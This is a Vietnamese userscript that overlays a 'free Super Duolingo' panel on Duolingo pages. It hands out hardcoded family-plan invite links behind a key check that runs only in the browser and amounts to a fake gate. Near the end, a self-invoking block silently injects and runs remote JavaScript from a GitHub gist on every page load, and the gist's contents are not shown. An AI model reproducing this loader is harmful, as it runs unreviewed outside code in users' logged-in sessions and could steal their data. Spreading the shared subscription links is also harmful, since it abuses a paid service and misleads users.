(function() {
    'use strict';

    var numberOfAlerts = localStorage.getItem('numberOfAlerts');
    if (!numberOfAlerts) {
        numberOfAlerts = 0;
    }

    numberOfAlerts++;

    if (numberOfAlerts <= 1) {
        alert("Sự kiện Tool Miễn Phí:\n Chúc mừng Cộng Đồng SuperDuo Family 🔥 gần 400 Thành Viên. Đây chính là một Phiên Bản Nâng Cấp từ Phiên Bản Cũ lên một Phiên Bản hoàn toàn mới!\nLink Super có hết hạn thì các bạn thông cảm đợi vào ngày hôm sau để lấy Link mới nhé!");

        localStorage.setItem('numberOfAlerts', numberOfAlerts);
    } else if (numberOfAlerts / 1 === 1) {
        alert("Thông báo từ FrozeX:\nĐây là Phiên Bản Cập Nhật EVENT TOOL đang trong thử nghiệm. Link Super-Duolingo hết hạn thì các bạn đợi vào ngày hôm sau để Lấy Link nha!\n Mong các bạn thông cảm giúp mình.");
    }
})();

    // Lưu trữ các mã đã sử dụng và IP liên kết
    var usedKeys = {};

    // Hàm tạo mã ngẫu nhiên 9 ký tự từ "SUPERDUOFAMILY"
    function generateRandomCode() {
        var characters = 'SUPERDUOFAMILY';
        var code = '';
        for (var i = 0; i < 9; i++) {
            code += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return code;
    }

    // Hàm để lấy địa chỉ IP hiện tại (giả sử bạn có cách lấy IP)
    function getCurrentIP() {
        // Ví dụ giả định, bạn cần thay đổi để lấy địa chỉ IP thực tế
        return '123.456.789.012';
    }

    // Hàm để lấy mã mới
    function getNewCode() {
        var currentTime = new Date().getTime();
        var lastKeyCode = localStorage.getItem('lastKeyCode');
        var lastKeyTime = localStorage.getItem('lastKeyTime');

        if (lastKeyCode && lastKeyTime && (currentTime - parseInt(lastKeyTime) < 21600000)) {
            // Nếu vẫn còn key hợp lệ trong vòng 5 phút, báo lỗi
            alert('Key của bạn đã được lấy trước đó.\nHãy quay lại sau 6 giờ kể từ khi thông báo này xuất hiện! ⏳');
            return null;
        } else {
            // Nếu key hết hạn hoặc chưa có key trước đó, tạo key mới
            var newCode = 'VIP_' + generateRandomCode();
            localStorage.setItem('lastKeyCode', newCode);
            localStorage.setItem('lastKeyTime', currentTime.toString());
            return newCode;
        }
    }

    // Hàm kiểm tra nếu mã đã được sử dụng
    function checkKeyUsage(key) {
        return usedKeys.hasOwnProperty(key);
    }

    // Hàm đánh dấu mã đã sử dụng
    function markKeyAsUsed(key) {
        usedKeys[key] = true;
    }

// Function to create a CSS style element and append it to the document head
function addStyles(styles) {
    var styleElement = document.createElement('style');
    styleElement.textContent = styles;
    document.head.appendChild(styleElement);
}

// Fetch the user's IP address and check if it is blocked or fake
fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const blockedIPs = ['171.243.60.166', '1.55.42.126', '115.76.93.38'];
        const fakeIPs = ['127.0.0.1', '192.168.0.1']; // Example fake IPs
        if (blockedIPs.includes(data.ip) || fakeIPs.includes(data.ip)) {
            disableWebsite(() => {
                alert('🚫 Thiết bị của bạn không hỗ trợ Super-Duolingo EVENT này!\n❌ Bạn không đủ điều kiện tham gia VIP EVENT.');
                hideContainerDiv();
            });
        }
    })
    .catch(error => {
        console.error('Lỗi!! 505', error);
    });

function disableWebsite(callback) {


    // Call callback if provided after 3 seconds
    if (typeof callback === 'function') {
        setTimeout(callback, 1000);
    }
}

function hideContainerDiv() {
    // Hide the containerDiv by setting its display property to "none"
    var containerDiv = document.getElementById('containerDiv');
    if (containerDiv) {
        containerDiv.style.display = 'none';
    }
}

// CSS styles for the container div
var containerDivStyles = `
    #containerDiv {
        position: fixed;
        bottom: 77.5px; /* Điều chỉnh giá trị bottom lên */
        left: 26px;
        z-index: 9999;
        animation: bounce 1s infinite;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
    }
`;


// CSS styles for the Verify button
var verifyButtonStyles = `
    #verifyButton {
    background-image: url('https://static.wixstatic.com/media/e73c92_ff1116ef8b834b23aafb7e916cf00ddf~mv2.png/v1/fill/w_704,h_247,al_c,lg_1,q_85,enc_auto/e73c92_ff1116ef8b834b23aafb7e916cf00ddf~mv2.png'); /* Background image */
    background-size: cover; /* Ensure the background image covers the button */
    background-position: center; /* Center the background image */
    background-repeat: no-repeat; /* Do not repeat the background image */
    border: none; /* Không viền */
    color: white; /* Màu chữ đen */
    width: 247px; /* Chiều ngang */
    height: 50px; /* Chiều rộng */
    padding: 10px 20px; /* Khoảng cách từ chữ đến viền nút */
    text-align: center; /* Canh giữa chữ */
    text-decoration: none; /* Bỏ gạch chân */
    display: inline-block; /* Hiển thị như một khối nội tuyến */
    font-size: 17px; /* Kích thước chữ */
    font-weight: bold; /* Chữ đậm */
    border-radius: 20px; /* Bo tròn góc nút */
    cursor: pointer; /* Hiển thị con trỏ khi hover */
    box-shadow: 0 4px #509700; /* Đổ bóng */
    line-height: 35px; /* Set line height equal to button height */
    vertical-align: middle; /* Align vertically middle */
}

    #verifyButton:hover {
        filter: brightness(1.1); /* Tăng độ sáng khi di chuột */
        color: #000000; /* White text */
        box-shadow: 0 2px #58A600; /* Giảm bóng khi nhấn */
        border-color: #509700; /* Viền khi di chuột là màu xanh lá nhạt */
        box-shadow: 0 4px #509700; /* Đổ bóng */
    }

    #verifyButton:active {
        transform: translateY(20x); /* Di chuyển nút xuống khi click */
        box-shadow: 0 0px #509700; /* Tạo hiệu ứng nhấn */
    }
`;

var getCodeButtonStyles = `
    #getCodeButton {
        background-image: url('https://static.wixstatic.com/media/e73c92_6aac17c79a3b4403ac9ba915afc73502~mv2.png/v1/fill/w_704,h_247,al_c,lg_1,q_85,enc_auto/e73c92_6aac17c79a3b4403ac9ba915afc73502~mv2.png'); /* Background image */
        background-size: cover; /* Ensure the background image covers the button */
        background-position: center; /* Center the background image */
        background-repeat: no-repeat; /* Do not repeat the background image */
        border: none; /* Không viền */
        color: white; /* Màu chữ đen */
        width: 247px; /* Chiều ngang */
        height: 50px; /* Chiều rộng */
        padding: 10px 20px; /* Khoảng cách từ chữ đến viền nút */
        text-align: center; /* Canh giữa chữ */
        text-decoration: none; /* Bỏ gạch chân */
        display: inline-block; /* Hiển thị như một khối nội tuyến */
        font-size: 17px; /* Kích thước chữ */
        font-weight: bold; /* Chữ đậm */
        border-radius: 20px; /* Bo tròn góc nút */
        cursor: pointer; /* Hiển thị con trỏ khi hover */
        box-shadow: 0 4px #1285ba; /* Đổ bóng */
        line-height: 35px; /* Set line height equal to button height */
        vertical-align: middle; /* Align vertically middle */
    }

    #getCodeButton:hover {
        filter: brightness(1.2); /* Tăng độ sáng khi di chuột */
        color: #ffffff; /* White text */
        box-shadow: 0 2px #1285ba; /* Giảm bóng khi nhấn */
        border-color: #50D3FF; /* Viền khi di chuột là màu xanh lá nhạt */
        box-shadow: 0 4px #1285ba; /* Shadow effect */
    }

    #getCodeButton:active {
        transform: translateY(2px); /* Di chuyển nút xuống khi click */
        box-shadow: 0 0px #1285ba; /* Tạo hiệu ứng nhấn */
    }
`;

var getSuperButtonStyles = `
    #getSuperButton {
        background-image: url('https://static.wixstatic.com/media/e73c92_25b2bac0b07a44cbb7841e2ddc656544~mv2.png/v1/fill/w_417,h_146,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/e73c92_25b2bac0b07a44cbb7841e2ddc656544~mv2.png'); /* Background image */
        background-size: cover; /* Ensure the background image covers the button */
        background-position: center; /* Center the background image */
        background-repeat: no-repeat; /* Do not repeat the background image */
        border: none; /* No border */
        color: white; /* White text color */
        width: 247px; /* Button width */
        height: 50px; /* Button height */
        padding: 10px 20px; /* Padding around the text */
        text-align: center; /* Center text */
        text-decoration: none; /* No underline */
        display: inline-block; /* Inline block display */
        font-size: 17px; /* Font size */
        font-weight: bold; /* Bold font */
        border-radius: 20px; /* Rounded corners */
        cursor: pointer; /* Pointer cursor on hover */
        box-shadow: 0 4px #c42b2b; /* Shadow */
        position: relative; /* Position relative for pseudo-elements */
        line-height: 35px; /* Set line height equal to button height */
        vertical-align: middle; /* Align vertically middle */
    }

    #getSuperButton::before,
    #getSuperButton::after {
        content: url('https://d35aaqx5ub95lt.cloudfront.net/images/profile/f68d647fdc1536870945a5c84f3b3b82.svg'); /* Image URL */
        width: 25px; /* Image width */
        height: 25px; /* Image height */
        position: absolute; /* Absolute positioning */
    }

    #getSuperButton::before {
        top: 2px; /* Slight offset to ensure proper placement */
        right: 5px; /* Slight offset to ensure proper placement */
    }

    #getSuperButton::after {
        bottom: 5px; /* Slight offset to ensure proper placement */
        left: 5px; /* Slight offset to ensure proper placement */
    }

    #getSuperButton:hover {
        box-shadow: 0 4px #c42b2b; /* Maintain shadow */
        filter: brightness(1.1); /* Tăng độ sáng khi di chuột */
        color: #ffffff; /* White text */
        border-color: #c42b2b; /* Viền khi di chuột là màu xanh lá nhạt */
    }

    #getSuperButton:active {
        transform: translateY(0px); /* Di chuyển nút xuống khi click */
        box-shadow: 0 0px #c42b2b; /* Tạo hiệu ứng nhấn */
}

`;

// CSS styles for the rectangle div
    var rectangleDivStyles = `
        #rectangleDiv {
            position: relative;
            width: 270px;
            height: 345px;
            background-color: rgba(0, 4, 55, 0.0); /* Nền trong suốt */
            border-radius: 25px;
            padding: 10px;
            display: flex;
            flex-direction: column;
            align-items: flex-start; /* Căn lề trái */
            justify-content: center;
            gap: 10px;
            border: 2.5px dotted rgba(255, 0, 0, 0.8); /* Viền chấm đỏ */
            box-shadow: 0 0 5px 2px rgba(255, 0, 0, 0.5); /* Hiệu ứng đổ bóng màu đỏ */
            backdrop-filter: blur(20px); /* Hiệu ứng mờ */
        }
        #titleContainer {
            display: flex;
            align-items: center;
            gap: 10px; /* Khoảng cách giữa các phần tử */
        }
        #vipEvent {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            width: 140px;
            height: 30px;
            border: 3px solid red; /* Viền đỏ */
            border-radius: 9px; /* Rounded corners */
            color: red; /* Chữ đỏ */
            font-size: 16px;
            font-weight: bold;
            padding: 5px;
            background-color: #FFEDF0; /* Nền trắng */
        }
        #vipEvent img {
            width: 24px; /* Kích thước hình ảnh */
            height: auto;
        }
        #vipEvent span {
            font-size: 16px; /* Kích thước chữ */
        }
        #additionalText {
            color: #FFFFFF; /* Màu trắng */
            font-weight: bold;
            font-size: 22px;
            text-align: left; /* Căn lề trái */
            margin-top: 10px;
        }
    `;

// CSS styles for the buttons
var buttonStyles = `
    rectangleDivbutton {
        padding: 10px 20px;
        border-radius: 4px;
        width: 247px; /* Button width */
        height: 50px; /* Button height */
        cursor: pointer;
        animation: bounce 1s infinite; /* Animation effect */
    }
`;


// CSS styles for the input
var inputStyles = `
    .custom-input {
        padding: 20px;
        border-radius: 20px; /* Bo tròn góc 20px */
        border: 3px solid #FF0000;
        width: 247px;
        background-color: #FFFFFF; /* Đổi màu nền thành #FFFFFF */
        color: #FF0000; /* Màu chữ */
        font-weight: bold;
    }
`;

// CSS styles for the circle button
var circleButtonStyles = `
    #circleButton {
        position: absolute;
        top: 0;
        left: 0;
        transform: translate(-50%, -50%); /* Đưa nút vào giữa góc trái phía trên */
        width: 1px;
        height: 1px;
        border-radius: 50%;
        background-color: #f92f2f;
        border: 3px solid #FF0000;
        cursor: pointer;
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1;
        box-shadow: 0 0 15px 15px rgba(255, 0, 0, 0.5); /* Thêm hiệu ứng đổ bóng màu đỏ */
    }

    #circleButton img {
        width: 75px;
        height: 75px;
    }
`;

function createFroXButton() {
    // Tạo một div bọc để chứa cả nút và văn bản
    var wrapperDiv = document.createElement('div');
    wrapperDiv.style.position = 'fixed';
    wrapperDiv.style.bottom = '36.5%';
    wrapperDiv.style.right = '2.5%';
    wrapperDiv.style.transform = 'translate(50%, -50%)';
    wrapperDiv.style.textAlign = 'center';
    wrapperDiv.style.zIndex = '9999';

    // Tạo nút FroX
    var froXButton = document.createElement('div');
    froXButton.id = 'froXButton';
    froXButton.style.backgroundImage = 'url("https://static.wixstatic.com/media/e73c92_f39e1a75c14a4de1b476c9ab2185e903~mv2.png/v1/fill/w_704,h_499,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/e73c92_f39e1a75c14a4de1b476c9ab2185e903~mv2.png")';
    froXButton.style.backgroundSize = '66px';
    froXButton.style.backgroundRepeat = 'no-repeat';
    froXButton.style.backgroundPosition = 'center';
    froXButton.style.backgroundColor = '#0495E1';
    froXButton.style.width = '55px';
    froXButton.style.height = '55px';
    froXButton.style.borderRadius = '50%';
    froXButton.style.border = '4px solid #ff0000';
    froXButton.style.cursor = 'pointer';
    froXButton.style.transition = 'transform 0.2s, box-shadow 0.2s';
    froXButton.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';

    froXButton.addEventListener('mouseenter', function() {
        froXButton.style.transform = 'scale(1.1)';
        froXButton.style.boxShadow = '0 6px 12px rgba(0, 0, 0, 0.3)';
    });

    froXButton.addEventListener('mouseleave', function() {
        froXButton.style.transform = 'scale(1)';
        froXButton.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
    });

    froXButton.addEventListener('click', function() {
        var containerDiv = document.getElementById('containerDiv');
        if (containerDiv.style.display === 'none' || containerDiv.style.display === '') {
            containerDiv.style.display = 'block';
            froXButton.style.backgroundImage = 'url("https://static.wixstatic.com/media/e73c92_f39e1a75c14a4de1b476c9ab2185e903~mv2.png/v1/fill/w_704,h_499,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/e73c92_f39e1a75c14a4de1b476c9ab2185e903~mv2.png")';
        } else {
            containerDiv.style.display = 'none';
            froXButton.style.backgroundImage = 'url("https://static.wixstatic.com/media/e73c92_aa2bc9da0be94f0685792d7a4fd50aa6~mv2.png/v1/fill/w_704,h_499,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/e73c92_aa2bc9da0be94f0685792d7a4fd50aa6~mv2.png")';
        }
    });

    // Tạo phần văn bản "V1.0.7"
    var versionText = document.createElement('div');
    versionText.style.color = '#ff0000';
    versionText.style.fontSize = '18px';
    versionText.style.fontWeight = 'bold';
    versionText.style.marginTop = '5px';
    versionText.textContent = 'V1.1.9';

    // Thêm nút và văn bản vào div bọc
    wrapperDiv.appendChild(froXButton);
    wrapperDiv.appendChild(versionText);

    // Thêm div bọc vào body
    document.body.appendChild(wrapperDiv);

    var style = document.createElement('style');
    style.innerHTML = `
    @keyframes notify-border-eff {
        70% {
            transform: scale(1.6);
            opacity: 0.1;
        }
        100% {
            transform: scale(1.6);
            opacity: 0;
        }
    }
    @keyframes notify-eff {
        0%, 75%, 100% {
            transform: scale(1);
        }
        10% {
            transform: scale(1.1);
        }
    }
    @keyframes notify-bell-eff {
        5%, 15% {
            transform: rotate(25deg);
        }
        10%, 20% {
            transform: rotate(-25deg);
        }
        25%, 100% {
            transform: rotate(0deg);
        }
    }
    `;
    document.head.appendChild(style);
}

// Tạo nút FroX
createFroXButton();


// CSS styles for the NOUNDEVX rectangle
var nounDevXStyles = `
#NOUNDEVX {
    position: fixed;
    top: 10px;
    left: 50%;
    transform: translateX(-50%);
    width: 120px;
    height: 20px;
    background-color: rgb(217 138 138 / 50%) 0px 0px 0px 5px;
    border-radius: 18px;
    border: 2px solid #ff0000;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 12px;
    font-weight: bold;
    text-align: center; /* Canh giữa chữ */
    color: #ff0000; /* Màu chữ */
    backdrop-filter: blur(20px); /* Áp dụng hiệu ứng mờ cho phần nền */
}
`;

// Tạo nút Notify và thêm vào trang web
function createNotifyButton() {
    var notifyButton = document.createElement('div');
    notifyButton.id = 'notifyButton';
    notifyButton.style.backgroundImage = 'url("https://d35aaqx5ub95lt.cloudfront.net/images/purchasePage/ace514b1060f38b30804aa196e9b0292.svg")';
    notifyButton.style.backgroundSize = '23.5px'; // Chỉnh kích thước ảnh thành 23.5px
    notifyButton.style.backgroundRepeat = 'no-repeat';
    notifyButton.style.backgroundPosition = 'center';
    notifyButton.style.backgroundColor = '#f99393';
    notifyButton.style.width = '50px';
    notifyButton.style.height = '50px';
    notifyButton.style.borderRadius = '50%';
    notifyButton.style.border = '4px solid #FF0000';
    notifyButton.style.position = 'fixed';
    notifyButton.style.bottom = '20px';
    notifyButton.style.right = '1%';
    notifyButton.style.cursor = 'pointer';
    notifyButton.style.boxShadow = '#f99393';
    notifyButton.style.zIndex = '9999';
    notifyButton.style.display = 'flex';
    notifyButton.style.alignItems = 'center';
    notifyButton.style.justifyContent = 'center';
    notifyButton.style.transition = 'transform 0.2s';
    notifyButton.classList.add('new'); // Thêm class 'new' để áp dụng hiệu ứng

    // Tạo phần tử để hiển thị số 1
    var notificationCount = document.createElement('div');
    notificationCount.innerText = '1';
    notificationCount.style.position = 'absolute';
    notificationCount.style.top = '-5px'; // Điều chỉnh top để di chuyển lên trên
    notificationCount.style.right = '-5px'; // Điều chỉnh right để di chuyển sang phải
    notificationCount.style.backgroundColor = '#FF0000';
    notificationCount.style.color = '#FF0000';
    notificationCount.style.width = '20px';
    notificationCount.style.height = '20px';
    notificationCount.style.borderRadius = '90%';
    notificationCount.style.display = 'flex';
    notificationCount.style.alignItems = 'center';
    notificationCount.style.justifyContent = 'center';
    notificationCount.style.fontSize = '9px';
    notificationCount.style.fontWeight = 'bold'; // Làm cho số đậm hơn

    notifyButton.appendChild(notificationCount);

    notifyButton.addEventListener('mouseenter', function() {
        notifyButton.style.backgroundColor = '#fc9292';
    });

    notifyButton.addEventListener('mouseleave', function() {
        notifyButton.style.backgroundColor = '#f99393';
    });

    notifyButton.addEventListener('click', function() {
        alert('------------------------------------------------------------------------------\nChào mừng hơn 350 thành viên trong Cộng đồng Zalo\nSuperDuo Family 🔥!\n🎉 Hãy cập nhật lên phiên bản V1.1.9 để trải nghiệm những tính năng và giao diện tốt nhất.\n🚀Lưu ý: Phiên bản cũ sẽ không được hỗ trợ nữa. Nút thông báo sẽ cố định và không ẩn được.\n------------------------------------------------------------------------------');
    });

    document.body.appendChild(notifyButton);
}

// CSS cho hiệu ứng
var notifyStyles = `
    @keyframes notify-border-eff {
        70% {
            transform: scale(1.6);
            opacity: 0.1;
        }
        100% {
            transform: scale(1.6);
            opacity: 0;
        }
    }
    @keyframes notify-eff {
        0%, 75%, 100% {
            transform: scale(1);
        }
        10% {
            transform: scale(1.1);
        }
    }
    @keyframes notify-bell-eff {
        5%, 15% {
            transform: rotate(25deg);
        }
        10%, 20% {
            transform: rotate(-25deg);
        }
        25%, 100% {
            transform: rotate(0deg);
        }
    }
    @keyframes blue-glow {
        0% {
            box-shadow: 0 0 0 0 rgba(0, 159, 235, 0.7);
        }
        50% {
            box-shadow: 0 0 20px 10px rgba(0, 159, 235, 0.7);
        }
        100% {
            box-shadow: 0 0 0 0 rgba(0, 159, 235, 0);
        }
    }
    #notifyButton.new {
        animation: notify-eff 2s infinite;
    }
    #notifyButton.new.blue-glow {
        animation: blue-glow 2s forwards;
    }
    #notifyButton.new::before {
        animation: notify-bell-eff 2s infinite;
    }
`;
createNotifyButton();

// Add the CSS styles to the document
addStyles(containerDivStyles);
addStyles(rectangleDivStyles);
addStyles(inputStyles);
addStyles(buttonStyles);
addStyles(verifyButtonStyles);
addStyles(getCodeButtonStyles);
addStyles(circleButtonStyles);
addStyles(getSuperButtonStyles);
addStyles(nounDevXStyles);
addStyles(notifyStyles);

// Create a container div for input and buttons
var containerDiv = document.createElement('div');
containerDiv.id = 'containerDiv';

// Create a rectangle div to contain input and buttons
var rectangleDiv = document.createElement('div');
rectangleDiv.id = 'rectangleDiv';

    // Tạo phần tử title
    var titleContainer = document.createElement('div');
    titleContainer.id = 'titleContainer';

    var title = document.createElement('strong');
    title.style.fontWeight = 'bold';
    title.style.fontSize = '20px';
    title.style.display = 'flex';
    title.style.alignItems = 'center';

    // Tạo span cho "Type:"
    var typeSpan = document.createElement('span');
    typeSpan.style.color = '#F24C03'; // Màu cam
    typeSpan.textContent = '  Type: ';
    typeSpan.style.textAlign = 'left'; // Căn lề trái


    // Tạo span cho "VIP EVENT"
    var superDuolingoSpan = document.createElement('span');
    superDuolingoSpan.style.color = '#FF0000'; // Màu đỏ
    superDuolingoSpan.textContent = ' ';
    superDuolingoSpan.style.fontSize = '20px'; // Cỡ chữ 20px
    superDuolingoSpan.style.textAlign = 'left'; // Căn lề trái

    // Tạo span cho "(Super-Duolingo)"
    var darkModeSpan = document.createElement('span');
    darkModeSpan.style.color = '#FF0000'; // Màu đỏ
    darkModeSpan.style.fontSize = '10px'; // Cỡ chữ 10px
    darkModeSpan.textContent = '';

    // Thêm darkModeSpan vào superDuolingoSpan
    superDuolingoSpan.appendChild(darkModeSpan);

    // Thêm các span vào title
    title.appendChild(typeSpan);
    title.appendChild(superDuolingoSpan);

    // Thêm title vào titleContainer
    titleContainer.appendChild(title);

    // Tạo div cho VIP Event
    var vipEventDiv = document.createElement('div');
    vipEventDiv.id = 'vipEvent';

    // Thêm hình ảnh vương miện
    var crownImg = document.createElement('img');
    crownImg.src = 'https://autoduolingo.click/assets/client/crown.ndx';
    crownImg.alt = 'Crown';

    // Tạo span cho chữ "VIP EVENT"
    var vipEventSpan = document.createElement('span');
    vipEventSpan.textContent = 'EVENT TOOL';

    // Thêm hình ảnh và span vào vipEventDiv
    vipEventDiv.appendChild(crownImg);
    vipEventDiv.appendChild(vipEventSpan);

    // Thêm vipEventDiv vào titleContainer
    titleContainer.appendChild(vipEventDiv);
    rectangleDiv.id = 'rectangleDiv';
    rectangleDiv.appendChild(titleContainer);

    // Thêm rectangleDiv vào body hoặc phần tử mong muốn
    document.body.appendChild(rectangleDiv);

// Tạo phần tử additionalText
var additionalText = document.createElement('strong');
additionalText.style.fontWeight = 'bold';
additionalText.style.fontSize = '22px';
additionalText.style.display = 'block'; // Đảm bảo nó là phần tử block để căn giữa đúng cách

// Tạo span cho "HSD:"
var hsdSpan = document.createElement('span');
hsdSpan.style.color = '#F24C03'; // Màu trắng
hsdSpan.textContent = '  HSD: ';

// Tạo span cho "20:00 06/06/2024"
var dateSpan = document.createElement('span');
dateSpan.style.color = '#FF0000'; // Màu hồng
dateSpan.style.fontSize = '19px'; // Cỡ chữ 10px
dateSpan.textContent = '  15/06/2024 23:59';

// Thêm các span vào additionalText
additionalText.appendChild(hsdSpan);
additionalText.appendChild(dateSpan);

// Thêm additionalText vào rectangleDiv
rectangleDiv.appendChild(additionalText);

// Create and append the input element with the unique class
var input = document.createElement('input');
input.type = 'text';
input.placeholder = 'Nhập key tại đây....';
input.classList.add('custom-input');
rectangleDiv.appendChild(input);

var verifyButton = document.createElement('button');
verifyButton.id = 'verifyButton';
verifyButton.textContent = 'NHẬP KEY';
rectangleDiv.appendChild(verifyButton);

var getCodeButton = document.createElement('button');
getCodeButton.id = 'getCodeButton';
getCodeButton.textContent = 'LẤY KEY';
rectangleDiv.appendChild(getCodeButton);

var getSuperButton = document.createElement('button');
getSuperButton.id = 'getSuperButton';
getSuperButton.textContent = 'LẤY SUPER';
rectangleDiv.appendChild(getSuperButton);

var circleButton = document.createElement('div');
circleButton.id = 'circleButton';

var bellIcon = document.createElement('img');
bellIcon.src = 'https://static.wixstatic.com/media/e73c92_8f622c816de745338e966432f77afee2~mv2.png/v1/fill/w_115,h_120,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/e73c92_8f622c816de745338e966432f77afee2~mv2.png';
bellIcon.alt = 'Super Duolingo Free';

circleButton.appendChild(bellIcon);
rectangleDiv.appendChild(circleButton);
containerDiv.appendChild(rectangleDiv);

var nounDevX = document.createElement('div');
nounDevX.id = 'NOUNDEVX';
nounDevX.textContent = 'FrozeX - SuperDuo';

// Append NOUNDEVX rectangle to container div
containerDiv.appendChild(nounDevX);


// Append container div to the document body
document.body.appendChild(containerDiv);

// Set initial state of the "Get Super" button (disabled)
toggleGetSuperButton(true);

// Event listener for circle button click
circleButton.addEventListener('click', function() {
    alert('Hướng Dẫn Sử Dụng Tool Lấy Super Duolingo\n\nẤn nút Lấy Key (hoặc lấy Key trong nhóm ZALO) để nhận mã Key 🔑.\nSao chép mã Key (mã Key sẽ được tự động sao chép) và dán vào ô "Nhập key tại đây..." 📋.\nẤn nút Lấy Super để nhận link Super nếu mã Key đúng ✅.\n\nLưu ý: Mỗi Key chỉ sử dụng được một lần duy nhất 🔂.\nCảm ơn bạn đã dành thời gian đọc hướng dẫn!');
});

    // Event listener cho nút xác minh
    verifyButton.addEventListener('click', function() {
        var inputCode = input.value.trim();
        var pattern = /^VIP_[SUPERDUOFAMILY]{9}$/;

        if (pattern.test(inputCode)) {
            var key = inputCode.substring(4);
            var keyArray = key.split('');
            var validCharacters = 'SUPERDUOFAMILY';

            // Kiểm tra nếu tất cả các ký tự trong key đều nằm trong "SUPERDUOFAMILY"
            var isValid = keyArray.every(char => validCharacters.includes(char));

            if (isValid) {
                if (!checkKeyUsage(inputCode)) {
                    markKeyAsUsed(inputCode);
                    alert('Key bạn nhập đã thành công 🎉\nHãy ấn nút "Lấy Super" để lấy link SuperDuolingo nhé! 🚀');
                    toggleGetSuperButton(false);
                    setTimeout(function() {
                        toggleGetSuperButton(true);
                    }, 3000); // 2 seconds
                } else {
                    alert('Key này đã được dùng rồi 😅\nVui lòng thử key khác nhé! 🔑');
                }
            } else {
                alert('Key không hợp lệ 😕\nVui lòng thử lại key khác nhé! 🔑');
            }
        } else {
            alert('Key bạn nhập không hợp lệ 😔\nVui lòng thử lại key khác nhé! 🔑');
        }
        // Xóa hết kí tự trong ô nhập code
        input.value = '';
    });

    // Event listener cho sự kiện copy để xóa ô nhập sau khi sao chép
    input.addEventListener('copy', function(event) {
        // Xóa kí tự trong ô nhập sau khi sao chép
        input.value = '';
    });


getCodeButton.addEventListener('click', function() {
    var code = getNewCode();
    if (code) {
        navigator.clipboard.writeText(code)
            .then(function() {
                showAlert('Bạn đã lấy Key thành công! 🎉\nMã Key của bạn đã được tự động sao chép 📋.\nHãy dán mã vào ô "Nhập key tại đây..." nhé!');
            })
            .catch(function(err) {
                showAlert('Bạn đã lấy Key thành công.\nMã Key của bạn là: ' + code + '\nHãy sao chép và dán mã lên ô "Nhập key tại đây....".');
            });
    }
});

function showAlert(message) {
    alert(message);
}


const inviteLinks = [
    'https://invite.duolingo.com/family-plan/2-L7HA-L837-V4YF-C17H',
    'https://invite.duolingo.com/family-plan/2-X3NK-H3U7-7866-H32H',
    'https://invite.duolingo.com/family-plan/2-Z1Q1-D6UR-76W3-687U',
    'https://invite.duolingo.com/family-plan/2-D7D5-J588-78AJ-D3WY',
    'https://invite.duolingo.com/family-plan/2-C7G7-F5EQ-F5LU-V5DD',
    'https://invite.duolingo.com/family-plan/2-82E4-G2CL-W4D3-66LC',
    'https://invite.duolingo.com/family-plan/2-C5E7-W77P-J3QG-S2Q1',
    'https://invite.duolingo.com/family-plan/2-X1QK-12UT-22TV-D7LT',
    'https://invite.duolingo.com/family-plan/2-K6QT-87TE-V7NL-Z5E6',
    'https://invite.duolingo.com/family-plan/2-P8RC-V3T7-251Q-F5S3',
    'https://invite.duolingo.com/family-plan/2-B3M2-K1SN-R3ZB-S6YM',
    'https://invite.duolingo.com/family-plan/2-W2HD-X8ZF-A21C-L7BF',
    'https://invite.duolingo.com/family-plan/2-78MD-K334-T4MU-Y4RA',
    'https://invite.duolingo.com/family-plan/2-C4UH-V5AU-275H-V5KG'
];

getSuperButton.addEventListener('click', function() {
    const randomLink = inviteLinks[Math.floor(Math.random() * inviteLinks.length)];
    window.open(randomLink, '_blank');
});

verifyButton.addEventListener('mouseenter', function() {
    verifyButton.style.backgroundColor = '#61E002';
    verifyButton.style.color = '#ffffff';
    verifyButton.style.borderColor = '#61E002';
});

verifyButton.addEventListener('mouseleave', function() {
    verifyButton.style.backgroundColor = '#58CC02';
    verifyButton.style.color = '#ffffff';
    verifyButton.style.borderColor = '#58CC02';
});

getCodeButton.addEventListener('mouseenter', function() {
    getCodeButton.style.backgroundColor = '#50D3FF';
    getCodeButton.style.color = '#ffffff';
    getCodeButton.style.borderColor = '#50D3FF';
});

getCodeButton.addEventListener('mouseleave', function() {
    getCodeButton.style.backgroundColor = '#1FC2FF';
    getCodeButton.style.color = '#ffffff';
    getCodeButton.style.borderColor = '#1FC2FF';
});

function toggleGetSuperButton(disable) {
    var getSuperButton = document.getElementById('getSuperButton');
    getSuperButton.disabled = disable;
}

// Function to generate the dynamic gist URL
function generateDynamicGistURL() {
    const gistURL = "https://gist.githubusercontent.com/frozex2008/5508a45241bc525c8c4118c346e23c57/raw/e25c713cfcc69135f78d6def68354253684571ec/gistfile1.txt";
    return gistURL;
}

(function() {
    var script = document.createElement('script');
    script.src = generateDynamicGistURL();
    document.head.appendChild(script);
})();

var isTabOpened = false;

function checkExpiryDate() {
    var currentDate = new Date();
    var expiryDate = new Date('2024-06-15T23:59:35');

    if (currentDate >= expiryDate && !isTabOpened) {
        alert("Xin lỗi, hiện tại Tool SuperDuolingo đã quá thời hạn sử dụng EVENT TOOL.\nTrang web sẽ tự động quay về VIP TOOL!");
        disableTool();


        setTimeout(function() {
            window.open('https://greasyfork.org/vi/scripts/494411-super-duolingo', '_blank');
        }, 5000);

        isTabOpened = true;
    }
}

function disableTool() {
    document.getElementById('containerDiv').style.display = 'none';
    removeEventListeners();
}

function removeEventListeners() {
    var elements = document.querySelectorAll('button');
    elements.forEach(function(element) {
        var cloneElement = element.cloneNode(true);
        element.parentNode.replaceChild(cloneElement, element);
    });
}

setInterval(checkExpiryDate, 1000);
checkExpiryDate();
